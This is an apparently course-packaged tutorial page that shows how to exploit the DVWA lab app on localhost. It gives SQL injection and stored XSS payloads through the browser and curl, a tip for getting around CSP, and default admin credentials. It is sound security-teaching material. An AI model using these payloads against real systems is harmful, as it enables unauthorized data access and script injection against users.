<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
<head>
    <title>1.4 Exploit Examples (DVWA UI &amp; curl)</title>
    <style type="text/css" media="screen">
		@import url( ../shared/style.css );
	</style>
	<script src="../shared/scormfunctions.js" type="text/javascript"></script>
	<script src="../shared/contentfunctions.js" type="text/javascript"></script>
</head>
<body>
<h1>1.4 Exploit Examples (DVWA UI &amp; curl)</h1>

<h3><strong>A) SQL Injection (SQLi)</strong></h3>

<ol>
    <li>DVWA → <em>SQL Injection</em> module. There is a parameter you can manipulate. Example payload: <code>1 OR 1=1</code>.
</li>
    <li>In browser: input <code>1 OR 1=1</code> and click Submit. You should see all entries returned.
</li>
    <li>Using curl:
</li>
</ol>

<p>First obtain session cookie by logging in:

 # get login page to get PHPSESSID cookie</p>

<p>curl -c cookies.txt http://localhost:8080/login.php</p>

<p># submit login</p>

<p>curl -b cookies.txt -c cookies.txt -d &quot;username=admin&amp;password=password&amp;Login=Login&quot; \</p>

<p>     http://localhost:8080/login.php</p>

<p>Now call SQLi endpoint (example path may differ; DVWA uses /vulnerabilities/sqli/)

 curl -b cookies.txt &quot;http://localhost:8080/vulnerabilities/sqli/?id=1%20OR%201=1&amp;Submit=Submit#&quot;</p>

<ol>
    <li>You should observe many results returned (authentication info visible on page).
</li>
</ol>

<p><strong>Errors &amp; fixes</strong></p>

<ul>
    <li><code>403</code> when attempting to use module → ensure you logged in with the session cookie and security set to <code>low</code>.
</li>
    <li><code>No output</code> or blank page → check container logs (<code>docker logs dvwa</code>) for PHP errors.
</li>
</ul>

<h3><strong>B) Cross-Site Scripting (Stored XSS)</strong></h3>

<ol>
    <li>DVWA → <em>XSS (Stored)</em>. Enter payload:
</li>
</ol>

<p>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</p>

<ol>
    <li>Submit and then view the page; alert should pop up.
</li>
</ol>

<p><strong>curl example</strong> (requires cookie):</p>

<p>curl -b cookies.txt -X POST -d &quot;name=attacker&amp;message=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&amp;Submit=Submit&quot; \</p>

<p>  http://localhost:8080/vulnerabilities/xss_s/</p>

<p># Then fetch the page where messages are listed (path varies) to see payload rendered.</p>

<p><strong>Errors &amp; fixes</strong></p>

<ul>
    <li>Script blocked by browser CSP or modern browser protections if DVWA upgraded — use browser devtools and disable CSP or use older browsers for teaching. Alternatively use an inline <code>&lt;img onerror=...&gt;</code> payload.
</li>
</ul>

<h3><strong>C) Broken Authentication (Brute force / Weak default creds)</strong></h3>

<ol>
    <li>DVWA → <em>Brute Force</em> module. Use <code>admin:password</code> and you’ll be able to log in.
</li>
    <li>DVWA also demonstrates weak password storage; inspect DB (H2? in DVWA it&#x27;s MySQL) — you can view stored hash formats.
</li>
</ol>

<p><strong>curl example</strong>:</p>

<p>curl -b cookies.txt -X POST -d &quot;username=admin&amp;password=password&amp;Login=Login&quot; \</p>

<p>  http://localhost:8080/vulnerabilities/brute/</p>

<p><strong>Errors &amp; fixes</strong></p>

<ul>
    <li>If brute force module blocks you due to rate limiting in the image, adjust DVWA security or logs.
</li>
</ul>

<script type="text/javascript">
</script>
</body>
</html>